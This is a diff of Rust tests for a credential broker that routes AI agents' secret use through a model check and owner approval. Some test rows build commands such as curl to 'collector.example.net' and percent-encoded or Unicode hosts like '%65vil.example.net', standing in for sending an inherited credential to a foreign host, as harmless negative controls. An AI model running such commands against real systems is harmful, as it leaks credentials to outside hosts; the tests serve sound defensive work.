@@ -23,7 +23,8 @@ use apassy::broker::{self, BrokerHandle, BrokerOptions, SharedVault};
 use apassy::contracts::CredentialKind;
 use apassy::vault::usage::{UseDecidedBy, UseOutcome};
 use apassy::vault::{
-    Declaration, Environment, Field, ItemDraft, Reversibility, RiskLevel, Scope, SecretValue, Vault,
+    DecidedBy, Declaration, Environment, Field, ItemDraft, Reversibility, RiskLevel, Scope,
+    SecretValue, Vault,
 };
 use tempfile::TempDir;
 
@@ -222,28 +223,50 @@ fn custom_run(
     .unwrap()
 }
 
-#[test]
-fn a_foreign_host_asks_even_without_a_literal_secret_reference() {
-    let fx = fixture_with(
-        Some(declaration(Environment::Staging, RiskLevel::Low)),
-        true,
-        Duration::from_millis(30),
-    );
-    // The process inherits the credential. It need not spell $SYNTH_SENTRY_KEY
-    // to use it. `true ||` also makes this a harmless negative control before the fix.
-    let response = run_in(
-        &fx,
-        &fx.project,
-        "true || curl https://collector.example.net/",
-    );
-    assert_eq!(code(&response), "approval_timeout");
-    assert!(response.error.unwrap().message.contains("another host"));
-    assert_eq!(model_calls(&fx), 0);
+/// Run `argv` with the item in the project folder.
+fn send_argv(fx: &Fixture, argv: &[&str]) -> WireResponse {
+    custom_run(
+        fx,
+        argv,
+        Some("Work on the synthetic project."),
+        "Work on the synthetic project.",
+    )
 }
 
+/// Run `argv` with the item in `cwd`, in another thread.
+fn argv_later_at(fx: &Fixture, cwd: &Path, argv: &[&str]) -> std::thread::JoinHandle<WireResponse> {
+    let socket = fx.socket.clone();
+    let token = fx.token.clone();
+    let item = fx.item_id;
+    let cwd = cwd.display().to_string();
+    let command: Vec<String> = argv.iter().map(|arg| (*arg).to_owned()).collect();
+    std::thread::spawn(move || {
+        client::send(
+            &socket,
+            &token,
+            Action::Run {
+                access_request_id: None,
+                codes: Default::default(),
+                items: vec![item],
+                command,
+                cwd,
+                purpose: "Work on the synthetic project.".into(),
+                path: Some("/usr/bin:/bin".into()),
+                user_request: Some("Work on the synthetic project.".into()),
+            },
+        )
+        .expect("broker answer")
+    })
+}
+
+/// A foreign host asks, also when it is encoded or in Unicode. The process inherits the
+/// credential, so it need not spell $SYNTH_SENTRY_KEY to use it (the plain
+/// `collector.example.net` row). `true ||` also makes each row a harmless negative
+/// control before the fix.
 #[test]
 fn encoded_or_unicode_hosts_cannot_disappear_before_routing() {
     for (host, program) in [
+        ("collector.example.net", "curl https"),
         ("%65vil.example.net", "curl https"),
         ("%65vil.example.net", "psql postgres"),
         ("bücher.example.net", "curl https"),
@@ -258,7 +281,12 @@ fn encoded_or_unicode_hosts_cannot_disappear_before_routing() {
         );
         let response = run_in(&fx, &fx.project, &format!("true || {program}://{host}/"));
         assert_eq!(code(&response), "approval_timeout", "{host}");
-        assert!(response.error.unwrap().message.contains("host"));
+        let message = response.error.unwrap().message;
+        assert!(message.contains("host"), "{host}: {message}");
+        if host == "collector.example.net" {
+            // A foreign host without a literal secret reference.
+            assert!(message.contains("another host"), "{message}");
+        }
         assert_eq!(model_calls(&fx), 0, "{host}");
     }
 }
@@ -364,39 +392,6 @@ fn hard_vetoes_ignore_a_permissive_model() {
 }
 
 #[test]
-fn a_fitting_owner_answer_cannot_supply_a_missing_user_request() {
-    let fx = fixture_with(
-        Some(declaration(Environment::Production, RiskLevel::Low)),
-        true,
-        Duration::from_millis(30),
-    );
-    let project = apassy::broker::project::project_of(&fx.project, None).unwrap();
-    with_vault(&fx, |v| {
-        v.allow_production(
-            fx.item_id,
-            &apassy::vault::answers::ProjectRef {
-                key: project.key,
-                label: project.label,
-            },
-            ActionKind::Read,
-            "synthetic test",
-            &[],
-        )
-    })
-    .unwrap();
-    let response = custom_run(&fx, &["git", "status", "--short"], None, "Check status.");
-    assert_eq!(code(&response), "approval_timeout");
-    assert!(
-        response
-            .error
-            .unwrap()
-            .message
-            .contains("did not send the user request")
-    );
-    assert_eq!(model_calls(&fx), 0);
-}
-
-#[test]
 fn agent_stated_task_requires_nonempty_user_request_without_a_hook() {
     // Owner decision (a): purpose alone cannot supply the agent-stated task.
     let fx = fixture_with(
@@ -416,6 +411,44 @@ fn agent_stated_task_requires_nonempty_user_request_without_a_hook() {
         );
     }
     assert_eq!(model_calls(&fx), 0);
+
+    // A fitting owner answer cannot supply a missing user request: a production item
+    // with "Allow production" for reads in this project still asks for `git status`.
+    let project = apassy::broker::project::project_of(&fx.project, None).unwrap();
+    with_vault(&fx, |v| {
+        v.save_declaration(
+            fx.item_id,
+            &declaration(Environment::Production, RiskLevel::Low),
+            Some("sentry"),
+            None,
+        )?;
+        v.allow_production(
+            fx.item_id,
+            &apassy::vault::answers::ProjectRef {
+                key: project.key,
+                label: project.label,
+            },
+            ActionKind::Read,
+            "synthetic test",
+            &[],
+        )
+    })
+    .unwrap();
+    let response = custom_run(&fx, &["git", "status", "--short"], None, "Check status.");
+    assert_eq!(
+        code(&response),
+        "approval_timeout",
+        "fitting production answer"
+    );
+    assert!(
+        response
+            .error
+            .unwrap()
+            .message
+            .contains("did not send the user request"),
+        "fitting production answer"
+    );
+    assert_eq!(model_calls(&fx), 0, "fitting production answer");
 }
 
 #[test]
@@ -439,7 +472,9 @@ fn an_agent_that_does_not_see_all_credentials_gets_not_granted_and_an_empty_cata
     assert_eq!(data["sees_all_credentials"], false);
 }
 
-/// Neither first use nor staging needs credential-by-credential setup.
+/// Neither first use nor staging needs credential-by-credential setup. Every agent, every
+/// changed script or argument, and a development/low-risk item each get a fresh model
+/// decision; a model allow creates no authority.
 #[test]
 fn first_use_of_staging_reaches_the_model_without_permission() {
     let fx = fixture(Some(declaration(Environment::Staging, RiskLevel::Medium)));
@@ -453,6 +488,111 @@ fn first_use_of_staging_reaches_the_model_without_permission() {
         assert!(v.answers_for_item(fx.item_id).unwrap().is_empty());
         assert!(v.exec_grants_for_agent(fx.agent_id).unwrap().is_empty());
     });
+
+    // All connected agents evaluate independently: another agent also gets a fresh
+    // model decision without a scope.
+    let token = with_vault(&fx, |v| {
+        let (agent, token) = v.register_agent("Other agent").unwrap();
+        v.set_agent_sees_all(agent.id, true).unwrap();
+        token.expose().to_owned()
+    });
+    assert_eq!(
+        decided_by(&send_run(
+            &fx.socket,
+            &token,
+            fx.item_id,
+            &fx.project,
+            &sentry_call()
+        )),
+        "Bouncer allowed",
+        "another agent"
+    );
+    assert_eq!(model_calls(&fx), 2, "another agent");
+
+    // A changed script and changed arguments get a fresh evaluation without setup.
+    let script = fx.project.join("safe-task.sh");
+    std::fs::write(&script, "#!/bin/sh\nexit 0\n").unwrap();
+    for argv in [
+        vec!["/bin/sh", "./safe-task.sh"],
+        vec!["/bin/sh", "./safe-task.sh", "new-argument"],
+    ] {
+        assert_eq!(
+            decided_by(&send_argv(&fx, &argv)),
+            "Bouncer allowed",
+            "{argv:?}"
+        );
+    }
+    std::fs::write(&script, "#!/bin/sh\n# new synthetic version\nexit 0\n").unwrap();
+    assert_eq!(
+        decided_by(&send_argv(&fx, &["/bin/sh", "./safe-task.sh"])),
+        "Bouncer allowed",
+        "changed script"
+    );
+    assert_eq!(model_calls(&fx), 5, "each script run is evaluated again");
+
+    // ADR 0025 §3: a development key of a known provider that goes to its hosts goes to
+    // the model under the development/low-risk baseline, and every use still requires a
+    // fresh model decision.
+    with_vault(&fx, |v| {
+        v.save_declaration(
+            fx.item_id,
+            &declaration(Environment::Development, RiskLevel::Low),
+            Some("sentry"),
+            None,
+        )
+    })
+    .expect("development declaration");
+    let uses_before = with_vault(&fx, |v| v.item_uses(fx.item_id, 100))
+        .expect("uses")
+        .len();
+    let first = run_in(&fx, &fx.project.join("sub"), &sentry_call());
+    assert_eq!(decided_by(&first), "Bouncer allowed", "development/low");
+    assert_eq!(model_calls(&fx), 6, "development/low");
+    let second = run_in(&fx, &fx.project, &sentry_call());
+    assert_eq!(decided_by(&second), "Bouncer allowed", "development/low");
+    assert_eq!(model_calls(&fx), 7, "each run is evaluated again");
+    assert!(fx.broker.approvals().pending().is_empty());
+    with_vault(&fx, |v| {
+        assert!(v.patterns().unwrap().is_empty());
+        assert!(v.answers_for_item(fx.item_id).unwrap().is_empty());
+        assert!(v.exec_grants_for_agent(fx.agent_id).unwrap().is_empty());
+        assert!(v.evaluation_scopes(fx.item_id).unwrap().is_empty());
+    });
+    let uses = with_vault(&fx, |v| v.item_uses(fx.item_id, 100)).expect("uses");
+    assert_eq!(
+        uses.len(),
+        uses_before + 2,
+        "one use per development/low run"
+    );
+    // Newest first: the two development/low runs.
+    assert!(
+        uses[..2]
+            .iter()
+            .all(|u| u.outcome == UseOutcome::Allowed && u.decided_by == UseDecidedBy::Bouncer)
+    );
+    let text = format!("{first:?} {second:?}");
+    assert!(!text.contains(SECRET));
+
+    // Back to the staging/medium declaration: another project asks without the model. It
+    // runs last, because its denial records a pattern.
+    with_vault(&fx, |v| {
+        v.save_declaration(
+            fx.item_id,
+            &declaration(Environment::Staging, RiskLevel::Medium),
+            Some("sentry"),
+            None,
+        )
+    })
+    .expect("staging declaration");
+    let other = fx.dir.path().join("other");
+    std::fs::create_dir_all(other.join(".git")).expect("other project");
+    let other = std::fs::canonicalize(other).expect("canonical");
+    let handle = argv_later_at(&fx, &other, &["git", "commit", "-m", "synthetic"]);
+    let run = waiting(&fx);
+    assert!(run.question.why.contains("is declared for the project"));
+    assert!(fx.broker.approvals().deny(run.id));
+    assert_eq!(code(&handle.join().unwrap()), "approval_denied");
+    assert_eq!(model_calls(&fx), 7, "another project");
 }
 
 #[test]
@@ -577,61 +717,8 @@ fn default_classification_needs_eighty_percent_even_for_a_safe_command() {
     assert_eq!(code(&handle.join().unwrap()), "approval_denied");
 }
 
-/// ADR 0025 §3: a development key of a known provider that goes to its hosts goes to the
-/// model at first use under the development/low-risk baseline. Every subsequent
-/// use still requires a fresh model decision.
-#[test]
-fn a_development_low_risk_item_uses_the_model_on_every_run() {
-    let fx = fixture(Some(declaration(Environment::Development, RiskLevel::Low)));
-    let first = run_in(&fx, &fx.project.join("sub"), &sentry_call());
-    assert_eq!(decided_by(&first), "Bouncer allowed");
-    assert_eq!(model_calls(&fx), 1);
-    let second = run_in(&fx, &fx.project, &sentry_call());
-    assert_eq!(decided_by(&second), "Bouncer allowed");
-    assert_eq!(model_calls(&fx), 2, "each run is evaluated again");
-    assert!(fx.broker.approvals().pending().is_empty());
-    with_vault(&fx, |v| {
-        assert!(v.patterns().unwrap().is_empty());
-        assert!(v.answers_for_item(fx.item_id).unwrap().is_empty());
-        assert!(v.exec_grants_for_agent(fx.agent_id).unwrap().is_empty());
-        assert!(v.evaluation_scopes(fx.item_id).unwrap().is_empty());
-    });
-    let uses = with_vault(&fx, |v| v.item_uses(fx.item_id, 10)).expect("uses");
-    assert_eq!(uses.len(), 2);
-    assert!(
-        uses.iter()
-            .all(|u| u.outcome == UseOutcome::Allowed && u.decided_by == UseDecidedBy::Bouncer)
-    );
-    let text = format!("{first:?} {second:?}");
-    assert!(!text.contains(SECRET));
-}
-
-/// All connected agents evaluate independently; model allows create no authority.
-#[test]
-fn another_agent_also_gets_a_fresh_model_decision_without_a_scope() {
-    let fx = fixture(Some(declaration(Environment::Staging, RiskLevel::Medium)));
-    let token = with_vault(&fx, |v| {
-        let (agent, token) = v.register_agent("Other agent").unwrap();
-        v.set_agent_sees_all(agent.id, true).unwrap();
-        token.expose().to_owned()
-    });
-    assert_eq!(
-        decided_by(&run_in(&fx, &fx.project, &sentry_call())),
-        "Bouncer allowed"
-    );
-    assert_eq!(
-        decided_by(&send_run(
-            &fx.socket,
-            &token,
-            fx.item_id,
-            &fx.project,
-            &sentry_call()
-        )),
-        "Bouncer allowed"
-    );
-    assert_eq!(model_calls(&fx), 2);
-}
-
+/// "Allow once" remembers nothing. Each new question is counted once, also when the owner
+/// answers it with an owner check (ADR 0025 §1, Gate 1 C §1).
 #[test]
 fn allow_once_runs_and_remembers_nothing() {
     let fx = fixture_model(
@@ -640,11 +727,20 @@ fn allow_once_runs_and_remembers_nothing() {
         Duration::from_secs(10),
         common::fake_bouncer(&[("task_match", -1.0)]),
     );
+    let interactions = |fx: &Fixture| -> u64 {
+        with_vault(fx, |v| v.interactions_per_week(1))
+            .expect("count")
+            .iter()
+            .map(|(_, count)| count)
+            .sum()
+    };
+    assert_eq!(interactions(&fx), 0);
     let handle = run_later(&fx, &fx.project, &sentry_call());
     let run = waiting(&fx);
     owner(&fx, OwnerAction::ApproveRun(run)).expect("approved");
     let response = handle.join().expect("run thread");
     assert_eq!(decided_by(&response), "Owner approved");
+    assert_eq!(interactions(&fx), 1, "one answer is one interaction");
     assert!(response.result.as_ref().expect("result")["remembered"].is_null());
     with_vault(&fx, |v| {
         assert!(v.answers_for_item(fx.item_id).expect("answers").is_empty());
@@ -689,6 +785,18 @@ fn a_remembered_execution_answer_does_not_create_evaluation_permission() {
         decided_by(&run_in(&fx, &fx.project, &sentry_call())),
         "Remembered answer"
     );
+    // B-3: a run that a remembered answer allowed is in the decision log as `Answer`, not
+    // as an owner decision, and it was not asked.
+    let log = with_vault(&fx, |v| v.decision_log()).expect("log");
+    let last = &log.last().expect("entry").entry;
+    assert_eq!(last.decided_by, DecidedBy::Answer);
+    assert!(!last.asked);
+    assert_eq!(log[0].entry.decided_by, DecidedBy::Owner);
+    let export = with_vault(&fx, |v| v.export_decisions_jsonl()).expect("export");
+    let line: serde_json::Value =
+        serde_json::from_str(export.lines().last().expect("line")).expect("json");
+    assert_eq!(line["decided_by"], "answer");
+    assert_eq!(line["asked"], false);
     with_vault(&fx, |v| {
         assert!(v.evaluation_scopes(fx.item_id).expect("scopes").is_empty());
         let answers = v.answers_for_item(fx.item_id).expect("answers");
@@ -806,6 +914,10 @@ fn an_always_ask_item_asks_each_time() {
             run.question.why.contains("is set to always ask"),
             "{}",
             run.question.why
+        );
+        assert!(
+            fx.broker.approvals().evaluation_offer(run.id).is_none(),
+            "an always-ask question offers no evaluation permission"
         );
         assert!(run.question.items[0].always_ask);
         assert!(
